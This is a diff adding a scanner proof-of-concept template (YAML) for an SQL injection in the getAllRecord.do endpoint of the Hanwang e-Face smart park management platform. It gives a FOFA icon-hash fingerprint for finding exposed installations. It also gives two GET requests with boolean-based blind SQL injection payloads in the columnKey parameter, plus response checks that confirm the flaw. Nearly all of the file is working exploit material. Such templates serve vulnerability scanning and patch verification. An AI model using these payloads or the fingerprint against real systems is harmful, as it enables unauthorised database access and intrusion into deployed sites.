@@ -1,0 +1,19 @@
+id: poc-yaml-hw-e-face-pass-spmp-getallrecord-do-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 getAllRecord.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+requests:
+- method: GET
+  path: /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2963)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1
+  expression: status_code == 200 && contains(body,"\"success\":false") && contains(body,"网络异常")
+    && !contains(body,"<")
+- method: GET
+  path: /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"total\":")
+    && contains(body,"\"obj\":") && !contains(body,"网络异常") && !contains(body,"<")
+variables: {}
+transport: http
